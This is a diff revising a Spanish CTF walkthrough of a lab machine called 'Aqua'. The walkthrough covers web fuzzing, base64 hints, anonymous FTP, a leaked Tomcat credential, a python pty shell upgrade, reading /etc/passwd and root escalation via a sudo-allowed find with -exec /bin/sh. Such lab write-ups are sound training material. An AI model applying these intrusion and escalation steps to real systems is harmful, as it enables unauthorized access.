@@ -71,10 +71,12 @@ El (agua)1 es una sustancia cuya molécula está compuesta por dos átomos de hi
 #Fuzzing
 
 web puerto 80
+http://192.168.2.242/
 
 000039:  C=301      9 L	      28 W	    312 Ch	  "img"
 000550:  C=301      9 L	      28 W	    312 Ch	  "css"
 #-------------------------------------------
+http://192.168.2.242/SuperCMS
 ==================================================================
 ID   Response   Lines      Word         Chars          Payload    
 ==================================================================
@@ -82,18 +84,18 @@ ID   Response   Lines      Word         Chars          Payload
 000002:  C=200    149 L	      25 W	    799 Ch	  "index - html"
 000116:  C=200     47 L	      90 W	   2146 Ch	  "login - html"
 
-en el codigo de  /SuperCMS/index.html
+en el codigofuente de /SuperCMS/index.html
 
 tenemos una cadena de texto que esta cifrado en base64 "MT0yID0gcGFzc3dvcmRfemlwCg=="
 
 echo "MT0yID0gcGFzc3dvcmRfemlwCg=="|base64 -d
 1=2 = password_zip
 
-con seguimos una pista 1=2 > password_zip, estos numeros los tenemos en el texto que copiamos antes 1 para agua 2 para H2O
+conseguimos una pista 1=2 > password_zip, estos numeros los tenemos en el texto que copiamos antes 1 para agua 2 para H2O
 
 tenemos una pagina llamada login.html le echamos un vistazo contiene un panel de login que no lleva a ningun lado esta de relleno
 
-pero si miramos el coodigo tiene un par de lienas comentadas
+pero si miramos el codigo tiene un par de lienas comentadas
 
 #------------------------------------------
 <!--<button class="btn" href="www.twitter.com/AquilinoMS">Contact</button>-->
@@ -102,6 +104,7 @@ pero si miramos el coodigo tiene un par de lienas comentadas
 
 hay un repo de github  de SuperCMS, nos descargamos el repositorio y accedemos a la carpeta
 
+❯ git clone https://github.com/aquilino/SuperCMS.git
 cd SuperCMS
 le hacemos un  git log y miramos los commits
 buscamos algun commit sospechoso  y veremos uno que crea un archivo de texto knocking_on_Atlantis_door.txt
@@ -161,7 +164,7 @@ PORT   STATE SERVICE VERSION
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
 
-tiene acceso con el usuario anonymous
+tenemos acceso como usuario anonymous
 
 
 #------------------------------
@@ -208,7 +211,6 @@ una vez descomprimido encotramos un archivo critico de tomcat donde se guardan l
 # Credenciales 
 
 aquaMan:P4st3lM4n --> tomcat
-tridente:N3ptun0D10sd3lM4r$ --> ssh
 --------------------------
 
 con estas credenciales accedemos al servicio tomcat
@@ -237,7 +239,7 @@ cat /etc/passwd| grep sh$
 root:x:0:0:root:/root:/bin/bash
 tridente:x:1000:1000:Poseidon Perez,,,:/home/tridente:/bin/bash
 
-hacemos un tratamineto de la tty 
+hacemos un tratamineto de la tty lo hago con python que no me da problemas
 python -c 'import pty;pty.spawn("/bin/bash")
 ctrl +z
 stty raw -echo;fg
@@ -279,7 +281,7 @@ si miramos el /etc/passwd veremos quiene es el user Poseidon perez
 
 accedemos por ssh como el usuario tridente y conseguimos la primera flag
 
-tridente@hidr0Gen:~$ id;whoami;hostname
+tridente@Atlantis:~$ id;whoami;hostname
 uid=1000(tridente) gid=1000(tridente) groups=1000(tridente)
 tridente
 Atlantis
@@ -289,13 +291,13 @@ Atlantis
 con sudo -l podemos ejecutar el binario find que se encuentra en la carpeta /home/tridente
 tridente@hidr0Gen:~$ sudo -l
 [sudo] password for tridente: 
-Matching Defaults entries for tridente on hidr0Gen:
+Matching Defaults entries for tridente on Atlantis:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User tridente may run the following commands on hidr0Gen:
+User tridente may run the following commands on Atlantis:
     (root) /home/tridente/find
 
-tridente@hidr0Gen:~$ sudo -u root /home/tridente/find . -exec /bin/sh \; -quit
+tridente@Atlantis:~$ sudo -u root /home/tridente/find . -exec /bin/sh \; -quit
 [sudo] password for tridente: 
 # id;whoami;hostname
 uid=0(root) gid=0(root) groups=0(root)
@@ -322,3 +324,5 @@ Session completed.
 
 
 con gpg -d root.txt.gpg  podremos ver la flag de root
+
+Hasta aqui la maquina Aqua.
